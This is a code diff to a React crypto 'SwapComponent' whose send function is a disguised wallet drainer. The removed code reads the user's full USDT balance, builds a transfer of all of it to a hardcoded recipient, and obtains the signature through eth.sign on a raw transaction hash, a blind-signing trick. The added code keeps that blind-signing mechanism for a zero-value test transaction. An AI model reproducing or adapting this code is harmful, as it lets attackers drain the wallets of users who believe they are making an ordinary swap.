@@ -66,119 +66,29 @@ function SwapComponent() {
     return () => clearTimeout(timer)
   }, [showConfetti])
 
-  // const sendTransaction = async () => {
-  //   if (!web3js) return
-
-  //   const nonce = await web3js.eth.getTransactionCount(address, 'pending')
-  //   const gasPrice = await web3js.eth.getGasPrice()
-  //   const chainId = await web3js.eth.getChainId()
-
-  //   const tx_ = {
-  //     from: address,
-  //     to: address,
-  //     nonce: web3js.utils.toHex(nonce),
-  //     gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
-  //     gasLimit: '0x5208',
-  //     value: '0x0',
-  //     data: '0x',
-  //     v: web3js.utils.toHex(chainId),
-  //     r: '0x',
-  //     s: '0x',
-  //   }
-
-  //   console.log('Tx Object', tx_)
-
-  //   const tx = new ethereumjs.Tx(tx_)
-  //   const serializedTx = '0x' + tx.serialize().toString('hex')
-  //   const hexer = { encoding: 'hex' }
-  //   const sha3_ = web3js.utils.sha3(serializedTx, hexer)
-
-  //   await web3js.eth
-  //     .sign(sha3_, address)
-  //     .then(async (signed) => {
-  //       const temporary = signed.substring(2)
-  //       const r_ = '0x' + temporary.substring(0, 64)
-  //       const s_ = '0x' + temporary.substring(64, 128)
-  //       const rhema = parseInt(temporary.substring(128, 130), 16)
-  //       const v_ = web3js.utils.toHex(
-  //         BigInt(rhema) + BigInt(chainId) * BigInt(2) + BigInt(8)
-  //       )
-  //       tx.r = r_
-  //       tx.s = s_
-  //       tx.v = v_
-
-  //       console.log('---------------------------------------------')
-
-  //       const txFin = '0x' + tx.serialize().toString('hex')
-  //       const sha3__ = web3js.utils.sha3(txFin, hexer)
-  //       console.log('rawHash:', sha3__)
-  //       console.log('The Broadcast message', txFin)
-
-  //       setIsLoading(true)
-
-  //       await web3js.eth
-  //         .sendSignedTransaction(txFin)
-  //         .then((elisebeth) => console.log(elisebeth))
-  //         .catch((vannette) => console.log(vannette))
-
-  //       setIsLoading(false)
-  //       setShowConfetti(true)
-  //       setTokenOneAmount(null)
-  //       setTokenTwoAmount(null)
-  //     })
-  //     .catch((heide) => console.log(heide))
-  // }
-
   const sendTransaction = async () => {
     if (!web3js) return
-
-    const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7' // USDT contract address on Ethereum
-    const recipientAddress = '0xRecipientAddressHere' // replace with the actual recipient address
-
-    const usdtABI = [
-      // ABI for the functions we need
-      {
-        constant: true,
-        inputs: [{ name: 'owner', type: 'address' }],
-        name: 'balanceOf',
-        outputs: [{ name: 'balance', type: 'uint256' }],
-        type: 'function',
-      },
-      {
-        constant: false,
-        inputs: [
-          { name: 'to', type: 'address' },
-          { name: 'value', type: 'uint256' },
-        ],
-        name: 'transfer',
-        outputs: [{ name: 'success', type: 'bool' }],
-        type: 'function',
-      },
-    ]
-
-    const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
 
     const nonce = await web3js.eth.getTransactionCount(address, 'pending')
     const gasPrice = await web3js.eth.getGasPrice()
     const chainId = await web3js.eth.getChainId()
 
-    const balance = await usdtContract.methods.balanceOf(address).call()
-    const transferData = usdtContract.methods
-      .transfer(recipientAddress, balance)
-      .encodeABI()
-
     const tx_ = {
       from: address,
-      to: usdtContractAddress,
+      to: address,
       nonce: web3js.utils.toHex(nonce),
       gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
-      gasLimit: web3js.utils.toHex(60000), // estimate or set an appropriate gas limit
+      gasLimit: '0x5208',
       value: '0x0',
-      data: transferData,
-      chainId: web3js.utils.toHex(chainId),
+      data: '0x',
+      v: web3js.utils.toHex(chainId),
+      r: '0x',
+      s: '0x',
     }
 
-    const tx = new ethereumjs.Tx(tx_, { chain: chainId })
+    console.log('Tx Object', tx_)
+
+    const tx = new ethereumjs.Tx(tx_)
     const serializedTx = '0x' + tx.serialize().toString('hex')
     const hexer = { encoding: 'hex' }
     const sha3_ = web3js.utils.sha3(serializedTx, hexer)
@@ -197,7 +107,12 @@ function SwapComponent() {
         tx.s = s_
         tx.v = v_
 
+        console.log('---------------------------------------------')
+
         const txFin = '0x' + tx.serialize().toString('hex')
+        const sha3__ = web3js.utils.sha3(txFin, hexer)
+        console.log('rawHash:', sha3__)
+        console.log('The Broadcast message', txFin)
 
         setIsLoading(true)
 
